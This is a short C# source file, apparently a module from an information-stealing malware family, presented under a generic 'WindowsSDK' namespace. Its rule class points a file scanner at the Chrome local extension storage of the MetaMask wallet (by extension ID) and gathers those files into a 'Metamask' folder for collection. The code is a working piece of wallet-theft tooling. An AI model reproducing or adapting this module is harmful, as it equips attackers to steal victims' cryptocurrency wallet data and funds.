using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class MetamaskRule : FileScannerRule
    {
        public MetamaskRule()
        {
            base.Name = "Metamask";
        }

        public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
        {
            return "Metamask";
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn";
                list.Add(new FileScannerArg
                {
                    Directory = directory,
                    Pattern = "*",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
